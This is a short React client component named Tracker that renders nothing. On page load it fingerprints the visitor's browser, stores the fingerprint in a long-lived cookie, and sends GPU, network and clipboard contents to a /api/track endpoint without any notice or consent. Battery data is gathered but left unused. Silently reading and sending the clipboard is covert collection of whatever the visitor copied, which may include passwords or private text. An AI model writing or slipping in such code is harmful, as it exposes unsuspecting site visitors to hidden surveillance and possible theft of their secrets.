"use client";
import { useEffect } from "react";
import { generateFingerprint, getGPUFingerprint, getNetworkInfo, getBatteryInfo, getClipboardData } from "../utils/fingerprint";

const Tracker = () => {
  useEffect(() => {
    const fingerprint = generateFingerprint();
    document.cookie = `fingerprint=${btoa(fingerprint)}; path=/; expires=Fri, 31 Dec 2025 23:59:59 GMT`;
    

    Promise.all([getNetworkInfo(), getBatteryInfo(), getClipboardData()]).then(([networkInfo, batteryInfo, clipboardData]) => {
      fetch("/api/track", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          fingerprint: JSON.parse(fingerprint),
          gpu: getGPUFingerprint(),
          network: networkInfo,
          
          clipboard: clipboardData,
          timestamp: new Date().toISOString(),
        }, null, 2),
      });
    });
  }, []);

  return null;
};

export default Tracker;